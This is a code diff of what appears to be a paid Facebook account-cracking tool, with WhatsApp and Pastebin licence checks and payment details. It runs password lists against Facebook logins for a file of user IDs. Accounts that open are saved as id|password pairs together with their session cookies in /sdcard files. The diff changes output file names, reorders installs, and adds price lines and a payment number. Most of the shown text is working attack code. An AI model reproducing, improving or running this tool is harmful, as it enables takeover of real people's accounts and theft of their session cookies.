@@ -1,30 +1,4 @@
 import os,zlib
-
-from os import system as osRUB
-from os import system as cmd
-os.system('clear')
-print('loading Modules ...\n')
-
-
-
-try:
-    import requests 
-except ImportError:
-    print('\n  installing Requests ...\n')
-    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-
-
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n  installing futures ...\n')
-    os.system('pip install futures')
-
-try:
-    import mechanize
-except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
-
 from urllib.request import Request, urlopen
 import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
 from concurrent.futures import ThreadPoolExecutor as sarfrazssb
@@ -38,8 +12,26 @@ from concurrent.futures import ThreadPoolExecutor as tred
 import base64
 import uuid
 import json
+from os import system as osRUB
+from os import system as cmd
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('git pull')
-
+print('loading Modules ...\n')
+try:
+    import requests 
+except ImportError:
+    print('\n  installing Requests ...\n')
+    os.system('clear')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n  installing futures ...\n')
+    os.system('pip install futures')
+try:
+    import mechanize
+except ModuleNotFoundError:
+    os.system('pip install mechanize > /dev/null')
+    os.system('git pull')
 pcp = []
 loop = 0
 oks = []
@@ -112,13 +104,15 @@ logo ="""███    ███ ██   ██ ██████
 [~] Facebook : MHB
 [~] Tool     : PAID
 [~] Version  : 1-0
+[~] \033[1;32mUPDATE DATE  : 17/JUN/2023\033[1;37m
 \033[1;37m--------------------------"""       
 def clear():
         os.system('clear')
         print(logo)
 def linex():
-        print('\033[1;37m--------------------------')
-def ze():
+    print('\033[1;37m--------------------------')
+
+def zee():
         try:
                 clear()
                 x = ("sex")
@@ -136,11 +130,11 @@ def ze():
                                 except FileNotFoundError:
                                         print('File location not found ')
                                         time.sleep(1)
-                                        ze()
+                                        zee()
                                 clear()
                                 #print(' All method working try 1 by 1 ')
                                 linex()
-                                print(' [1] Method 1 \n [2] Method 2')
+                                print(' [1] Method [1]')
                                 linex()
                                 mthd=input(' Choose: ')
                                 linex()
@@ -171,7 +165,8 @@ def ze():
                                         for user in fo:
                                                 ids,names = user.split('|')
                                                 passlist = plist
-                                                crack_submit.submit(ffb,ids,names,passlist)                                                 
+                                                if mthd in ['1','01']:
+                                                        crack_submit.submit(ffb,ids,names,passlist)
                                 print('\033[1;32m')
                                 linex()
                                 print(' The process has completed')
@@ -204,7 +199,8 @@ def ffb(ids,names,passlist):
                         coki=";".join([k+"="+v for k,v in dc.items()])
                         if "c_user" in session.cookies.get_dict():
                                 print('\r\r\033[1;32m[OK] %s|%s'%(ids,pas))
-                                open('/sdcard/ok.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/MUNA-COKE.txt', 'a').write(coki+'\n')
+                                open('/sdcard/MHB-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/MHB-cooki.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in session.cookies.get_dict():
@@ -219,7 +215,9 @@ def ffb(ids,names,passlist):
                                 continue
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
-        loop+=1                
+        loop+=1
+
+ 
 def menu_apikey():
   mhb = str(os.geteuid()) + str(os.getlogin())
   id = "a".join(mhb)
@@ -235,13 +233,16 @@ def menu_apikey():
 [~] Facebook : MHB
 [~] Tool     : PAID
 [~] Version  : 1-0
+[~] \033[1;32mUPDATE DATE  : 17/JUN/2023\033[1;37m
+[~] \033[1;32mPAK USER 15/DAY 300 /30 DAY 500\033[1;37m
 [~] \033[1;32mPAK USER 03403233915 JAZZ CASH\033[1;37m
+[~] \033[1;32mMIX COUNTRY $2 /15 DAYS /$4 30 DAYS\033[1;37m
 [~]\033[1;32m]MIX CONTRY BINNACE  UID 742599258\033[1;37m
-\033[1;37m--------------------------""")                  
+\033[1;37m--------------------------""")                        
   print("\t \033[1;37mFIRST GET APPROVEL\033[1;37m ")
   print(" \033[1;37mTHIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
-  print("\x1b[1;97mcontact Admin to Buy this Tools");time.sleep (0.1) 
-  print("\033[1;37 KEY:"+id)
+  print("\x1b[1;97mcontact Admin to Buy this Tools                                                               ");time.sleep (0.1) 
+  print("\033[1;37YOUR  KEY : "+id)
   print("\033[1;37mCOPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
   print("SEND KEY ON ADMIN WHATSAPP  ");time.sleep(1)
   os.system('xdg-open https://wa.me/+923273988991')
@@ -255,24 +256,23 @@ def menu_apikey():
       time.sleep(0.5)
       pass
     else:
-      print("\x1b[1;97mSorry Bro Token Key not Aproved“")
+      print("\x1b[1;97mSorry Bro Token Key not Aproved")
       print("Send payment to Admin and get aproval"); time.sleep(2)
       os.system('xdg-open https://wa.me/+923273988991')
       time.sleep(2)
       sys.exit()
   except:
     sys.exit()
-    if ___name___ == '__main__':
-    	print(logo)
-    	menu_apikey()
+    if __name__ == '__main__':
+        print(logo)
+        menu_apikey()
 menu_apikey() 
 def tnx():
-  mhb = str(os.geteuid()) + str(os.getlogin())
-  id = "_".join(mhb)
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "_".join(uuid)
   server = requests.get('https://pastebin.com/raw/FxecR5Vh').text
   os.system(" clear ")
   print(logo)
-  print(" Wait bro,,,, ")
   print("Chacking Your Aproval ")
   print("\x1b[1;97mCHECKING YOUR APROVAL            ");time.sleep (0.5)
   try:
@@ -283,19 +283,19 @@ def tnx():
       time.sleep(0.5)
       pass
     else:
-      print("\x1b[1;97mSorry Bro Your Token not Aproved")
+      print("\x1b[1;97mSorry Bro Your Token not AprovedðŸ˜“ ")
       print("Send payment to Admin and get aproval"); time.sleep(2)
       os.system('xdg-open https://wa.me/+923273988991')
       time.sleep(2)
       sys.exit()
   except:
     sys.exit()
-    if __name__=='__main__':
-	print(logo)
+    if __name__ == '__main__':
+        print(logo)
         menu_apikey()
 try:
-      ze()
+    zee()
 except requests.exceptions.ConnectionError:
-	print('\n No internet connection ...')
-	exit()
+    print('\n No internet connection ...')
+    exit()
 except:exit()
